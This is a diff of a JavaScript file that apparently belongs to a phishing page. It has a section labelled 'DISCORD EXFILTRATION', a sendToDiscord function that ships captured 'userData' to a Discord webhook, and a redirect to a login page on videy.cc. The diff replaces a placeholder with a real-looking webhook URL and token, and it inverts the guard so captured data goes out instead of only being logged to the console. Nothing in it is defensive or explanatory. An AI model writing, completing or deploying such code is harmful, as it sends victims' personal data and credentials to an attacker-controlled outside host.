@@ -512,7 +512,7 @@
          */
 
         // --- CONFIGURATION ---
-        const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1566257578730848397/JzAzEoWOvcmStPpOQ08w-9H1utVYu8ZsgVjghVkJoXPdQfPyzYM23sszZo0EMEvweluY"; 
         const REDIRECT_URL = "https://www.videy.cc/login"; 
 
         let userData = {
@@ -810,7 +810,7 @@
 
         // --- DISCORD EXFILTRATION ---
         function sendToDiscord(label) {
-            if (WEBHOOK_URL === "https://discord.com/api/webhooks/1566257578730848397/JzAzEoWOvcmStPpOQ08w-9H1utVYu8ZsgVjghVkJoXPdQfPyzYM23sszZo0EMEvweluY") {
+            if (WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
                 console.log(`[${label}] User Data Captured:`, userData);
                 return;
             }
